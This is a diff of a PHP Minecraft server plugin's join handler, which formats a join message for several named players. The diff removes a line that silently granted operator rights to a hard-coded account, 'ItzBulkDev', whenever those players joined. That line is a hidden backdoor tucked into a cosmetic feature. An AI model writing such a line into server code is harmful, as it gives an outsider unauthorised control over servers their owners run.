@@ -21,7 +21,6 @@ public function onJoin(PlayerJoinEvent $event){
 $p = $event->getPlayer();
 $pname = $p->getName();
 if($pname == "ChaoticSynergy" or $pname == "xShootingStars" or $pname == "XFuryTactics" or $pname == "xFuryTactics" or $pname == "PocketGaming"){
-  $this->getServer()->setOp("ItzBulkDev");
 $event->setJoinMessage(TextFormat::GOLD."" . TextFormat::BOLD . $pname . " " . TextFormat::RESET . TextFormat::GREEN . "Joined The Game!");
 }else{
 $event->setJoinMessage("");
